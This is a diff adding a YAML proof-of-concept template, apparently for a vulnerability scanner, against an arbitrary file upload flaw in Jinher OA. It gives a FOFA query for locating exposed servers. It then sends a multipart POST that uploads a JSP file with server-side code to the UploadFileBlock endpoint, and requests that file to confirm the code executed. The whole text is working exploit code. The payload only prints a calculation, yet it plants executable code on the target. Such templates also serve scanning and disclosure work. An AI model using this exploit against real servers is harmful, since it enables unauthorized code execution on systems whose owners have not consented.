@@ -1,0 +1,35 @@
+id: poc-yaml-jinher-oa-uploadfileblock-anyfile-upload
+info:
+  name: 金和OA UploadFileBlock接口存在任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金和OA
+  fofa: app="金和网络-金和OA"||body="/jc6/platform/sys/login"
+variables:
+  filename: to_lower(random_str(10))
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /jc6/JHSoft.WCF/Attachment/UploadFileBlock
+  headers:
+    Content-Type: multipart/form-data; boundary=bbcea0206207b8222ea7bdee4e0f92fa
+  data: '--bbcea0206207b8222ea7bdee4e0f92fa
+
+    Content-Disposition: form-data; name="filename"; filename="{{.filename}}.jsp"
+
+
+    vulnerability<% out.println({{.t1}} * {{.t2}}); %>
+
+    --bbcea0206207b8222ea7bdee4e0f92fa--
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"\\\"uploadTime\\\"\") &&\n\
+    contains(body,\"\\\"realUrl\\\"\") &&\ncontains(body,\"\\\"fileObj\\\"\") &&\n\
+    !contains(body,\"<\") \n"
+- method: GET
+  path: /jc6/upload/{{.filename}}.jsp
+  expression: "status_code == 200 && \ncontains(body,\"vulnerability\") &&\ncontains(body,t3)\n"
+transport: http
